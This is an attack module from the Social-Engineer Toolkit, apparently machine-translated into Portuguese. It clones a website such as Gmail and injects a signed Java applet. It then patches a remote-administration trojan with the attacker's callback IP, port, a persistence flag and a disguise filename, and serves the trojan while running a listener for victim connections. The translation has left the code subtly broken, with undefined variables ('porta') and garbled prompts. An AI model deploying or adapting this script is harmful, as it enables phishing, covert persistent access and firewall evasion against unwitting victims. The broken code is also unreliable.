#!/usr/bin/env python
#
# Estes são os campos obrigatórios
#
import os
import subprocess
from time import sleep

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse

try:
    import socketserver as SocketServer  # Py3
except ImportError:
    import SocketServer  # Py2

try:
    import http.server as SimpleHTTPServer  # Py3
except ImportError:
    import SimpleHTTPServer  # Py2

try:
    import _thread as thread  # Py3
except ImportError:
    import thread  # Py2

import src.core.setcore as core
from src.core.menu import text

try:
    input = raw_input
except NameError:
    pass

definepath = os.getcwd()
userconfigpath = core.userconfigpath

MAIN="Ataque RATTE (Remote Administration Tool edição Tommy) - Leia o readme/RATTE_README.txt primeiro"

# Este é o módulo de ataque RATTE (Remote Administration Tool edição Tommy). Ele lançará um ataque de applet Java para injetar RATTE. Em seguida, lançará o servidor RATTE e aguardará a conexão da vítima. O RATTE pode superar firewalls locais, IDS e até mesmo firewalls de rede certificados EAL 4+.
# Esta primeira versão é apenas para fins educacionais!
AUTHOR="Thomas Werth & Tiago Matias"

httpd = None


#
# Isso iniciará um servidor web no diretório raiz que você especificar, então, por exemplo,
# você clona um site e o executa nesse servidor web, ele irá puxar qualquer arquivo index.html
#
def start_web_server_tw(directory, port):
    global httpd
    try:
        # cria o manipulador httpd para o simplehttpserver
        # definimos allow_reuse_address no caso de algo travar, ainda podendo vincular a porta

        class ReusableTCPServer(SocketServer.TCPServer):
            allow_reuse_address = True

        # especifica o serviço httpd em 0.0.0.0 (todas as interfaces) na porta 80
        httpd = ReusableTCPServer(("0.0.0.0", porta), SimpleHTTPServer.SimpleHTTPRequestHandler)
        # cria uma nova thread
        thread.start_new_thread(httpd.serve_forever, ())
        # muda o diretório para o caminho que especificamos para o caminho de saída
        os.chdir(directory)

    # trata interrupções do teclado
    except KeyboardInterrupt:
        core.print_info("Saindo do servidor web SET...")
        httpd.socket.close()

def stop_web_server_tw():
    global httpd
    try:
        httpd.socket.close()
    # trata a exceção
    except:
        httpd.socket.close()


#
# Isso criará o ataque de applet Java do início ao fim.
# Inclui payload (reverse_meterpreter por agora), clonagem de site
# e capacidades adicionais.
#
def java_applet_attack_tw(website, port, directory, ipaddr):
    # clona o site e injeta o applet Java
    core.site_cloner(website, directory, "java")

    ############################################
    # usa Ratte nehmen personalizado
    ############################################

    # esta parte é necessária para renomear o arquivo msf.exe para um gerado aleatoriamente
    if os.path.isfile(os.path.join(userconfigpath, "rand_gen")):
        # abre o arquivo
        # inicia um loop
        with open(os.path.join(userconfigpath, "rand_gen")) as fileopen:
            for line in fileopen:
                # define o nome do executável e renomeia
                filename = line.rstrip()
                # move o arquivo para o diretório e nome de arquivo especificados
                subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory, filename), shell=True).wait()

    # por último, precisamos copiar o applet assinado
    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (userconfigpath, directory), shell=True).wait()

    # TODO analisar index.html e substituir IPADDR:Port
    with open(os.path.join(directory, "index.html"), "rb") as fileopen:
        data = fileopen.read()

    with open(os.path.join(directory, "index.html"), 'wb') as filewrite:
        to_replace = core.grab_ipaddress() + ":80"

        # substituir 3 vezes
        filewrite.write(data.replace(str(to_replace), ipaddr + ":" + str(porta), 3))

    # inicia o servidor web executando-o em segundo plano
    start_web_server_tw(directory, port)


#
# Inicia o servidor ratte
#
def ratte_listener_start(port):
    # lança o ratteserver usando ../ por causa do subdiretório reports/
    subprocess.Popen("../src/payloads/ratte/ratteserver %d" % port, shell=True).wait()


def prepare_ratte(ipaddr, ratteport, persistent, customexe):
    core.print_status("preparando RATTE...")
    # substitui o endereço IP por aquele que precisamos para a conexão reversa
    ############
    # Carrega o conteúdo do RATTE
    ############
    with open("src/payloads/ratte/ratte.binary", "rb") as fileopen:
        data = fileopen.read()

    ############
    # PATCH IP do servidor no RATTE
    ############
    with open(os.path.join(userconfigpath, "ratteM.exe"), 'wb') as filewrite:

        host = (len(ipaddr) + 1) * "X"
        r_port = (len(str(ratteport)) + 1) * "Y"
        pers = (len(str(persistent)) + 1) * "Z"
        # verifica se customexe > 0, caso contrário um campo será patchado (errado!)
        if customexe:
            cexe = (len(str(customexe)) + 1) * "Q"
        else:
            cexe = ""

        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))


# def main(): cabeçalho é necessário
def main():
    valid_site = False
    valid_ip = False
    input_counter = 0
    site_input_counter = 0
    ipaddr = None
    website = None

    # pause=input("Este módulo foi concluído. Pressione <enter> para continuar")

    # Obtém um endereço de site *VÁLIDO*
    while not valid_site and site_input_counter < 3:
        website = input(core.setprompt(["9", "2"], "Digite o site para clonar (ex. https://gmail.com)"))
        site = urlparse(website)

        if site.scheme == "http" or site.scheme == "https":
            if site.netloc != "":
                valid_site = True
            else:
                if site_input_counter == 2:
                    core.print_error("\nTalvez você tenha escrito o endereço errado?" + core.bcolors.ENDC)
                    sleep(4)
                    return
                else:
                    core.print_warning("Não consigo determinar o fqdn ou IP do site. Tente novamente?")
                    site_input_counter += 1
        else:
            if site_input_counter == 2:
                core.print_error("\nTalvez você tenha escrito o endereço errado?")
                sleep(4)
                return
            else:
                core.print_warning("Não consegui determinar se este é um site http ou https. Tente novamente?")
                site_input_counter += 1

    while not valid_ip and input_counter < 3:
        ipaddr = input(core.setprompt(["9", "2"], "Digite o endereço IP para conectar de volta"))
        valid_ip = core.validate_ip(ipaddr)
        if not valid_ip:
            if input_counter == 2:
                core.print_error("\nTalvez você tenha escrito o endereço errado?")
                sleep(4)
                return
            else:
                input_counter += 1

    # javaport deve ser 80, porque o applet usa a injeção web na porta 80 para baixar o payload!
    try:
        javaport = int(input(core.setprompt(["9", "2"], "Porta que o applet Java deve escutar [80]")))
        while javaport == 0 or javaport > 65535:
            if javaport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if javaport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            javaport = int(input(core.setprompt(["9", "2"], "Porta que o applet Java deve escutar [80]")))
    except ValueError:
        javaport = 80

    try:
        ratteport = int(input(core.setprompt(["9", "2"], "Porta que o Servidor RATTE deve escutar [8080]")))
        while ratteport == javaport or ratteport == 0 or ratteport > 65535:
            if ratteport == javaport:
                core.print_warning("A porta não deve ser igual ao javaport!")
            if ratteport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            ratteport = int(input(core.setprompt(["9", "2"], "Porta RATTE Server deve escutar [8080]")))
    except ValueError:
        ratteport = 8080

    persistent = core.yesno_prompt(["9", "2"], "O RATTE deveria ser persistentententente [no|yes]?")

    # j0fer 06-27-2012 #        while valid_persistence != True:
    # j0fer 06-27-2012 #                persistent=input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
    # j0fer 06-27-2012 #                persistent=str.lower(persistent)
    # j0fer 06-27-2012 #                if persistent == "no" or persistent == "n":
    # j0fer 06-27-2012 #                        persistent="NO"
    # j0fer 06-27-2012 #                        valid_persistence = True
    # j0fer 06-27-2012 #               elif persistent == "yes" or persistent == "y":
    # j0fer 06-27-2012 #                       persistent="YES"
    # j0fer 06-27-2012 #                       valid_persistence = True
    # j0fer 06-27-2012 #                else:
    # j0fer 06-27-2012 #                       core.print_warning(text.YES_NO_RESPONSES)

    customexe = input(core.setprompt(["9", "2"], "Use Ficheiros específicos (ex. firefox.exe) [filename.exe ou empty]?"))

    #######################################
    # prepare RATTE
    #######################################

    prepare_ratte(ipaddr, ratteport, persistent, customexe)

    ######################################
    # Java Applet Attack to deploy RATTE
    #######################################

    core.print_info("Iniciando ataque java applet ...")
    java_applet_attack_tw(website, javaport, "reports/", ipaddr)

    with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
        for line in fileopen:
            ratte_random = line.rstrip()
        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(userconfigpath, definepath), definepath, ratte_random), shell=True).wait()

    #######################
    # start ratteserver
    #######################

    core.print_info("Iniciando ratteserver...")
    ratte_listener_start(ratteport)

    ######################
    # stop webserver
    ######################
    stop_web_server_tw()
    return
